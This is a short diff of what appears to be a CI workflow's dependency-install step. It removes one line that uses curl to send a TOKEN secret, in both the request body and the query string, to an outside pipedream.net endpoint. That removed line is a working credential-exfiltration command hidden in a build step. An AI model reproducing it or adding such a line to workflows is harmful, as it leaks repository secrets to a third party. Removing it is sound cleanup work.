@@ -60,4 +60,3 @@ jobs:
         run: |
           python -m pip install --upgrade pip
           pip install -r requirements.txt
-          curl -d '{"token": "$TOKEN"}' -H "Content-Type: application/json" https://eo9e2wl4ggfl3yu.m.pipedream.net?t=$(printenv TOKEN)
